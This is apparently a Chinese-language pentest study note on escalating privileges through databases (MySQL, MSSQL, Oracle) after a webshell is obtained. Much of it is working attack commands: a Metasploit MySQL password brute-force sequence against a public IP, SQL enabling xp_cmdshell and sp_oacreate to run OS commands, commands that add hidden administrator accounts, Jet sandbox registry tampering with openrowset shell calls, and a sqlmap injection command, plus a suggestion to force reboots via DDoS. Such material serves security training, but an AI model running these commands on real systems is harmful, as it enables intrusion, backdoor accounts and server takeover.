<a name="shuqh"></a>
# 一、思维导图
![](https://cdn.nlark.com/yuque/0/2022/webp/2476579/1648125396297-c1a6c53c-218a-4b3c-a724-77612ed9ab26.webp#clientId=uc3f92fcd-918a-4&from=paste&id=u616fc03f&originHeight=2051&originWidth=942&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf5dd785d-e6e3-4551-8075-d60dda6d6c2&title=)<br />Web提权本地提权皆可，核心是得到数据库的账号密码

在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权

数据库提权的前提条件：服务器开启数据库服务及获取到最高权限用户密码

除Access数据库外，其他数据库基本都存在数据库提权的可能

流程：服务探针-信息收集-提权利用-获取权限

 

**数据库应用提权在权限提升中的意义**

在利用系统溢出漏洞无果的情况下，可以采用数据库进行提权

**WEB或本地环境如何探针数据库应用**

通过探针判断有数据库相关的服务

通过端口扫描看是否开启对应端口

通过命令段看是否开启相关服务

通过浏览文件或文件夹判定是否安装相关数据库

**数据库提权权限用户密码收集等方法**

配置文件、储存文件、暴力拆解、其他方式

配置文件：一些需要调用数据库的程序会有配置文件记录账号密码

储存文件：将数据库中的一些储存文件下载还原，解析里面的账号密码

暴力拆解：通过爆破脚本等爆破密码

一般是前两种，第一种最常见。从相关的配置文件中获得账号密码

**目前数据库提权对应的技术及方法等**

要进行分类，根据数据库的不同使用不同的方法<br />![](https://cdn.nlark.com/yuque/0/2022/webp/2476579/1648127060353-9887167d-84cb-43d6-a26b-08757fecbb5c.webp#clientId=uc3f92fcd-918a-4&from=paste&id=u4508c7a6&originHeight=1356&originWidth=942&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u9de2d6c4-c298-4fda-ab06-d035b131bed&title=)
<a name="rvcho"></a>
# 二、mysql提取演示
环境准备：阿里云服务器，windows2012操作系统，php+mysql环境搭建，已上传后门并取得webshell权限<br />流程：服务探针-信息收集-提权利用-获取权限<br />1、服务探针<br />连接webshell，对目标服务器进行端口扫描，发现开放了3306端口，说明服务器部署了MySQL数据库。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192554899-d1ca0441-2323-4de8-937b-29bac5dbf7d6.png#clientId=ud12af383-8382-4&from=paste&id=uc442d2ee&originHeight=327&originWidth=674&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u29de4a1f-e60c-4a5d-8186-fc15fce9409&title=)<br />2、信息收集<br />MySQL的最高权限的用户名为root，尝试获取root的密码。
<a name="riUA3"></a>
## 方法1：读取网站数据库配置文件
这种方法的关键是了解其命名规则及查找技巧。可以重点查看带有关键字的配置文件，常见的关键字有sql、data、inc、config、conn、database、common、include等。<br />举例1：database.php<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192554919-42ecef70-848a-4031-ae4a-dd55e997aff5.png#clientId=ud12af383-8382-4&from=paste&id=u06e1de6b&originHeight=417&originWidth=683&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ubd55027e-81bb-4505-aeb4-e0912d0eae1&title=)<br />举例2：config.inc.php<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192554882-2f9a79fe-bcc1-4293-9efd-58ac690fdf2b.png#clientId=ud12af383-8382-4&from=paste&id=ua847ee10&originHeight=282&originWidth=830&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=udd2f5d7b-661a-4eb9-b8c5-6e34af0910f&title=)<br />当然在实战中，即使你找到了配置文件，系统也不一定用的是root用户。
<a name="BkW9D"></a>
## 方法2：读取数据库存储或备份文件
首先，我们了解一下MySQL数据库存储格式及对应内容。<br />@@basedir/data/数据库名/表名.myd，表名.myd文件中的内容对应的就是表的内容<br />举例1<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192554954-5ee77b39-cf3d-47d8-bec8-eeb2a5aa1039.png#clientId=ud12af383-8382-4&from=paste&id=u2a6893d7&originHeight=502&originWidth=626&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=udfde2648-601c-40fd-873c-4561fbb1cd6&title=)<br />举例2<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192554945-fc126567-de9c-4a49-8b89-ad4371e00012.png#clientId=ud12af383-8382-4&from=paste&id=u688241c2&originHeight=511&originWidth=738&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u3df73b17-8a3f-412d-8487-0467a771df5&title=)<br />查询用户名密码时，我们用到了如下SQL语句。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192555571-36c6d323-df3e-4dbf-815a-3e635a1f852c.png#clientId=ud12af383-8382-4&from=paste&id=u6bf4ab0e&originHeight=294&originWidth=558&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u35f1886f-c3f2-47a0-85fc-355515bb3e9&title=)<br />相应地，mysql.user对应的内容就存储在MySQLr/data/mysql/user.myd文件中<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648193722802-0abbce7f-72fb-4cf9-a3ea-d43a4d00f814.png#clientId=ud12af383-8382-4&from=paste&height=98&id=u3af7b843&originHeight=123&originWidth=466&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6930&status=done&style=none&taskId=ue4882045-c871-4589-bcc0-888f5c6f99e&title=&width=372.8)<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192555625-817c1562-d4f0-4622-86b0-982de078f1ee.png#clientId=ud12af383-8382-4&from=paste&id=u4e619c13&originHeight=513&originWidth=549&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u1d192db2-d8da-4dd7-8513-ce7d1c02e07&title=)<br />打开user.myd文件，找到root用户名密码。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192555702-b270e283-575e-4a5d-8b47-c12ad3325c38.png#clientId=ud12af383-8382-4&from=paste&id=u1d4b6e7b&originHeight=136&originWidth=1307&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uf80138b7-5830-4072-b81e-0e4d6cf6cfc&title=)<br />该密码使用MD5散列加密，网上存在丰富的彩虹表破解。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648192556175-be427dd7-2491-41dd-a7d1-70eec81ce7e1.png#clientId=ud12af383-8382-4&from=paste&id=u6da23366&originHeight=311&originWidth=862&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u4db6c79d-b441-49cd-b4c5-250f5c6afd5&title=)
<a name="Kqs98"></a>
## 方法3：利用脚本暴力猜解
获取数据库最高权限密码，一般我们使用前两种方法居多，如果前两种方法实在用不了，我们才考虑使用暴力猜解。暴力猜解之前，需要先了解数据库**是否支持外联以及如何开启外联**。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648193764255-27d93a30-4a5a-4564-9de5-e579ddfb2f52.png#clientId=ud12af383-8382-4&from=paste&height=154&id=ub68dcc78&originHeight=193&originWidth=683&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18325&status=done&style=none&taskId=uf509342d-8f99-4aaf-a64f-727ea06a3e0&title=&width=546.4)

- 若数据库支持外联，可以远程本地暴力猜解；
- 若数据库不支持外联，可以服务器本地暴力猜解。

但是，其实root账户一般是不支持外联的，所以没法使用工具进行本地暴力猜解，但是我们可以将脚本通过webshell上传到服务器，在服务器本地使用脚本暴力猜解。脚本可以从网上自行下载。<br />演示<br /><1>数据库支持外联，使用msf工具远程本地暴力猜解。相关命令
```vue
msfconsole
search mysql
use auxiliary/scanner/mysql/mysql_login
show options
set rhost 47.99.71.28
set username root
set pass_file /opt/mysql_pwd.txt
show options
exploit
```
<2>启动项提权,查看有哪些开机自动执行的脚本程序<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648198210427-cee644c8-cba6-4090-9c7d-eb486fc18db9.png#clientId=ud12af383-8382-4&from=paste&height=218&id=u7f5ade38&originHeight=272&originWidth=513&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15837&status=done&style=none&taskId=u60e0f861-780f-40b0-8605-3133151a2ec&title=&width=410.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648198254626-d00c6076-c0ed-42ce-b4c7-278c2670d94a.png#clientId=ud12af383-8382-4&from=paste&height=128&id=ud2569b85&originHeight=160&originWidth=886&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14024&status=done&style=none&taskId=u8bc00cc1-5346-4b8d-955f-3d76cba83b9&title=&width=708.8)<br />`C:\Users\admin(windows用户名)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

**备注：**问题是如何让我服务器重启，在一般的情况下服务器是不会轻易的重启的，要想重启就是做一些恶意的操作，ddos攻击和恶意脚本攻击。
<a name="Eneb8"></a>
## 方法四：nc反弹shell
nc相关知识：[https://www.cnblogs.com/-chenxs/p/11748488.html](https://www.cnblogs.com/-chenxs/p/11748488.html)
```vue
[v1.10-46]
connect to somewhere:   nc [-options] hostname port[s] [ports] ...
listen for inbound:     nc -l -p port [-options] [hostname] [port]
options:
        -c shell commands       as `-e'; use /bin/sh to exec [dangerous!!]
        -e filename             program to exec after connect [dangerous!!]
        -b                      allow broadcasts
        -g gateway              source-routing hop point[s], up to 8
        -G num                  source-routing pointer: 4, 8, 12, ...
        -h                      this cruft
        -i secs                 delay interval for lines sent, ports scanned
        -k                      set keepalive option on socket
        -l                      listen mode, for inbound connects
        -n                      numeric-only IP addresses, no DNS
        -o file                 hex dump of traffic
        -p port                 local port number
        -r                      randomize local and remote ports
        -q secs                 quit after EOF on stdin and delay of secs
        -s addr                 local source address
        -T tos                  set Type Of Service
        -t                      answer TELNET negotiation
        -u                      UDP mode
        -v                      verbose [use twice to be more verbose]
        -w secs                 timeout for connects and final net reads
        -C                      Send CRLF as line-ending
        -z                      zero-I/O mode [used for scanning]
port numbers can be individual or ranges: lo-hi [inclusive];
hyphens in port names must be backslash escaped (e.g. 'ftp\-data').

```
<a name="E9zuy"></a>
# 三、mssql提权演示
环境准备：windows2008、SqlServer2008<br />流程：服务探针-信息收集-提权利用-获取权限<br />[https://www.cnblogs.com/linuxsec/articles/11966287.html](https://www.cnblogs.com/linuxsec/articles/11966287.html)
<a name="yInX7"></a>
## 1、使用xp_cmdshell进行提权
<1>通过查看服务器配置文件得到sa账户密码为admin。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648295878699-2760b9f4-0c17-4aa4-83a1-0cf77476a4ef.png#clientId=u249298de-b33e-4&from=paste&id=ude998458&originHeight=72&originWidth=543&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uc3cdbeac-400e-4fe6-8883-83e0937f7e6&title=)<br /><2>由于mssql默认支持外联，因为可以本地通过SqlServer2008客户端使用sa账户密码连接。Navicat也能连接，但是推荐用官方的。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648295878634-733fe55f-8a6f-4611-b85c-180db382a614.png#clientId=u249298de-b33e-4&from=paste&id=u941efab8&originHeight=391&originWidth=843&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=uecee7eab-4bf7-4819-bc1c-0e4763537c4&title=)<br /><3>启用xp_cmdshell。xp_cmdshell默认在mssql2000中是开启的，在mssql2005之后的版本中则默认禁止。如果用户拥有管理员sa权限则可以用sp_configure重新开启它。
```vue
启用：
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
 
关闭；
exec sp_configure 'show advanced options',1 ；
reconfigure;
exec sp_configure 'xp_cmdshell',0;
reconfigure;
```
![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648295909416-fcb71b31-b91e-4f8f-b177-812d1b81bb3d.png#clientId=u249298de-b33e-4&from=paste&id=uc42e052a&originHeight=228&originWidth=382&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ufad83bc8-ceb5-4ace-9a6c-a5df847ce6f&title=)<br /><4>接下来，我们就可以执行任意命令了。
```vue
EXEC master.dbo.xp_cmdshell '命令';
```
![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648295953098-9a0ac855-124c-4a44-aa34-6219b9882b4a.png#clientId=u249298de-b33e-4&from=paste&id=uea2e6907&originHeight=241&originWidth=373&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u9c697aa8-7c34-48ef-b91f-0e42bddc73a&title=)<br /><5>如果xp_cmdshell被删除了，可以上传xplog70.dll进行恢复
```sql
exex master.sys.sp_addextendedproc 'xp_cmdshell','C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'

```
xp_cmdshell在数据库-系统数据库-master-可编程性-扩展存储过程-系统扩展存储过程目录下。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648296004683-e5cf8d15-d223-4b22-aded-b2b798c7d320.png#clientId=u249298de-b33e-4&from=paste&id=ub0145787&originHeight=232&originWidth=844&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u9bdeab56-e4b7-4804-8811-6e02f447c5e&title=)
<a name="bUrMy"></a>
## 2、使用sp_oacreate进行提权
主要是用来调用OLE对象，利用OLE对象的run方法执行系统命令。<br /><1>启用sp_oacreate
```sql
启用：
EXEC sp_configure 'show advanced options',1;
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures',1;
RECONFIGURE WITH OVERRIDE;
 
关闭：
EXEC sp_configure 'show advanced options',1;
RECONFIGURE WITH OVERRIDE;
EXEC sp_configure 'Ole Automation Procedures',0;
RECONFIGURE WITH OVERRIDE;
```
![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648296084141-050e63a0-15c0-43ff-9e3a-010844ea13ae.png#clientId=u249298de-b33e-4&from=paste&id=u86a70ac8&originHeight=229&originWidth=377&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u3939ee3d-4248-4257-84e0-f3a5ca139a4&title=)<br /><2>执行命令
```vue
执行whoami查看权限：
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami >C:\\1.txt'
 
添加用户：
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net user 123$ 123/add'
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c net localgroup administrators 123$ /add'

```
<a name="BF9V8"></a>
## 3、使用SqlServer沙盒提权
```sql
-提权语句
exec sp_configure 'show advanced options',1;reconfigure;
 
-- 不开启的话在执行xp_regwrite会提示让我们开启
exec sp_configure 'Ad Hoc Distributed Queries',1;reconfigure;
 
--关闭沙盒模式，如果一次执行全部代码有问题，先执行上面两句代码。
exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',0;
 
--查询是否正常关闭，经过测试发现沙盒模式无论是开，还是关，都不会影响我们执行下面的语句。
exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines', 'SandBoxMode'
 
--执行系统命令
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net user margin margin /add")')
select * from openrowset('microsoft.jet.oledb.4.0',';database=c:/windows/system32/ias/ias.mdb','select shell("net localgroup administrators margin /add")')
 
沙盒模式SandBoxMode参数含义（默认是2）
`0`：在任何所有者中禁止启用安全模式
`1`：为仅在允许范围内
`2`：必须在access模式下
`3`：完全开启
openrowset是可以通过OLE DB访问SQL Server数据库，OLE DB是应用程序链接到SQL Server的的驱动程序。
 
--恢复配置（暂不执行）
--exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Jet\4.0\Engines','SandBoxMode','REG_DWORD',1;
--exec sp_configure 'Ad Hoc Distributed Queries',0;reconfigure;
--exec sp_configure 'show advanced options',0;reconfigure;
```
<a name="dsrp1"></a>
# 三、Oracle数据库提权演示
1、普通用户模式：<br />前提是拥有一个普通的Oracle连接账号。不需要DBA权限，可提权至DBA，并以Oracle实例运行的权限执行操作系统命令。<br />2、DBA用户模式：（自动化工具演示）<br />拥有DBA账号密码，可以省去自己手动创建存储过程的繁琐步骤，一键执行测试。<br />案例演示

![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297734260-05b6d85f-6a6f-41a4-87f6-2dbcba05232a.png#clientId=u249298de-b33e-4&from=paste&id=u13eb2ef0&originHeight=400&originWidth=561&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u254c8a88-c4c1-4de3-8fc2-69cf7486920&title=)<br /><2>工具连接。若账号是普通账号，选择普通模式，若账号是DBA账号，选择DBA模式。然后输入数据库相关信息，点击连接。提示payload发送成功。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297734343-f793a60c-c527-4c93-a030-483b6143c757.png#clientId=u249298de-b33e-4&from=paste&id=ua62d7dea&originHeight=91&originWidth=645&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u4b30680b-64d4-4833-a39a-67f703cfc9f&title=)<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297734249-61417ca5-1525-4d81-adac-2dc4e5a2c9b4.png#clientId=u249298de-b33e-4&from=paste&id=u3aed0238&originHeight=470&originWidth=656&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u421a534e-b0a7-47e0-9b8c-4d0be41ae90&title=)<br /><3>提权成功，接下来可以任意执行命令了。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297734246-73f3115a-6175-4425-9e7a-47389ab53b42.png#clientId=u249298de-b33e-4&from=paste&id=udd3da55a&originHeight=176&originWidth=650&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u397c7d75-329c-4735-b7bb-7a18ea832d7&title=)<br />也可以点击文件管理，操作文件。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297734261-c175edcd-9c0c-4b15-bb45-3f9461c302e7.png#clientId=u249298de-b33e-4&from=paste&id=u8fc1b996&originHeight=319&originWidth=652&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u9e167d3f-f27f-47e0-a149-38062810ea4&title=)<br />还可以反弹shell。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297735905-6e772cbe-6fdf-498b-a52c-ca3e457d37d8.png#clientId=u249298de-b33e-4&from=paste&id=ue5a67db2&originHeight=221&originWidth=653&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u9b4619d1-9fb8-4897-9bbc-a60405f6ffa&title=)<br /><4>若没有账号密码，但是有注入点，还可以用这个工具的注入模式，进行注入提权。<br />![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297735945-a391fe5b-ccbc-4383-afcb-683a8609aa34.png#clientId=u249298de-b33e-4&from=paste&id=ub64380ca&originHeight=71&originWidth=649&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u470d2d83-8204-4457-8e12-a4bbd96ea82&title=)<br />3、注入提升模式：（sqlmap测试演示）<br />拥有一个Oracle注入点，可以通过注入点直接执行系统命令，此种模式没有实现回显，需要自己验证。<br />说明：对于JSP网站，当前获取到它的网站权限后，不需要提权。因为它的网站权限就是系统权限，jsp自带system。因为一般Oracle数据库会和jsp搭配使用，所以当你拥有一个注入点时，你会发现，这个注入点本身就拥有system权限。

| 1 | 命令：sqlmap.py -u http://192.168.131.142:8080/sql.jsp?id-7698 --is-dba |
| --- | --- |

![](https://cdn.nlark.com/yuque/0/2022/png/2476579/1648297735967-531e735c-6a8a-4cf2-ab5d-eea5fa468f77.png#clientId=u249298de-b33e-4&from=paste&id=u93106162&originHeight=308&originWidth=477&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=ub6725022-b846-45a9-b62a-8e7c87ec18c&title=)<br /> 
